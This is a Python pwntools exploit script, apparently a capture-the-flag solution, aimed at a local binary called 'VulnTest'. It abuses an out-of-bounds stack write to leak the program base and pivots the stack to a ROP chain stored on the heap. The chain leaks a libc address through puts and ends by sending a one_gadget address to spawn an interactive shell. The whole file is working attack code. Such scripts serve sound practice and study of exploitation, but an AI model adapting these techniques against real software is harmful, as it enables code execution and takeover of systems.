from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    #p = process("./VulnTest")#,env = {"LD_PRELOAD":"./libasan.so.4"})
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./VulnTest")
else:
    pass

def menu(choice):
    p.sendlineafter("command>> \n",str(choice))

def str_menu():
    menu(1)

def str_exit():
    menu(3)

def str_insert(string):
    # $ d u f s c n p e x X o g
    filters = "$dufscnpexXog"
    for x in string:
        if x in filters:
            print "your input cannot send"
            exit(0)
    menu(1)
    p.sendafter("Input your test string:\n",string)

def str_show():
    menu(2)

def stack_menu():
    menu(2)

def stack_exit():
    menu(3)

def stack_insert(index,data):
    menu(1)
    p.sendlineafter("So,tell me where you want to start(0~47):",str(index))
    p.sendafter("There is a stack overflow!\n",data)

def stack_show():
    menu(2)

def heap_insert(key,size,content):
    menu(1)
    p.sendlineafter("Input card's key:\n",key)
    p.sendlineafter("Input card's size:\n",str(size))
    p.sendlineafter("Input card's content:\n",content)
    p.recvuntil("Success~\n")

def heap_exit():
    menu(5)

code_base = 0x555555554000
def debugf():
    if debug:
        gdb.attach(p,"b *{b1}\nb *{b2}\nb *{b3}".format(b1 = hex(code_base + 0x7242),b2 = hex(code_base + 0x7765),b3 = hex(code_base + 0x79C0)))

def conn():
    global p
    p = process("./VulnTest")
    while True:
        stack_menu()
        stack_insert(-0xc0,"\x18\x00")
        stack_show()
        p.recvuntil("There is your note:\n")
        info = p.recvuntil("\n",drop = True)
        if len(info) == 6 and info[0] == "\x15":
            return p,info
        else:
            p.close()
            p = process("./VulnTest")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
p = 0
p,info = conn()
code_base = u64(info.ljust(8,"\x00")) - 0x7a15
log.success("code_base:" + hex(code_base))
#debugf()
stack_show()
main_addr = code_base + 0x6FEC + 1
stack_insert(0x20,p64(main_addr).rstrip("\x00") + "\x00")
stack_menu()
"""
.text:00000000000079C0                 sub     rsp, 0FFFFFFFFFFFFFF80h
.text:00000000000079C4                 pop     rbx
.text:00000000000079C5                 pop     r12
.text:00000000000079C7                 pop     r13
.text:00000000000079C9                 pop     r14
.text:00000000000079CB                 pop     rbp
.text:00000000000079CC                 retn
"""
target = code_base + 0x73C8
stack_insert(-0xc0 + 0x28,p64(target).rstrip("\x00") + "\x00")
pop_rdi = code_base + 0x0000000000008f03
pop_rsi_rbp = code_base + 0x0000000000004d8b
set_edx = code_base + 0x0000000000008cae
ret = code_base + 0x0000000000000328
elf.address = code_base
rop_addr = 0x625000000100 + 0x200 * 8
rop_data = ""
rop_data += p64(0) * 0x200 + p64(0xdeadbeef)
rop_data += p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"])
rop_data += p64(pop_rdi) + p64(0)
rop_data += p64(pop_rsi_rbp)+ p64(rop_addr + 0x60) + p64(0)
rop_data += p64(set_edx)
rop_data += p64(elf.plt["read"])
rop_data += p64(ret)
rop_data += p64(0xdeadbeef)
#rop_data += p64(0xdeadbeef)
#rop_data += "/bin/sh\x00"
rop_data += p64(0) * 0x40
rop_data = rop_data.ljust(0x2000)
heap_insert("x",len(rop_data),rop_data) 
heap_exit()
stack_menu()
data = p64(rop_addr)
for i in range(len(data)):
    temp = data[i]
    if temp == "\x00":
        stack_insert(-0xc0 + 0x20 + i,"\n")
    else:
        stack_insert(-0xc0 + 0x20 + i,temp + "\x00")
leave_ret = code_base + 0x0000000000004ab6
debugf()
stack_insert(-0xc0 + 0x28,p64(leave_ret).rstrip("\x00") + "\x00")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["puts"]
log.success("libc_base:" + hex(libc.address))
one_gadget = libc.address + 0x4f322
#p.send(p64(binsh) + p64(libc.symbols["system"]))
p.send(p64(one_gadget))
p.interactive()
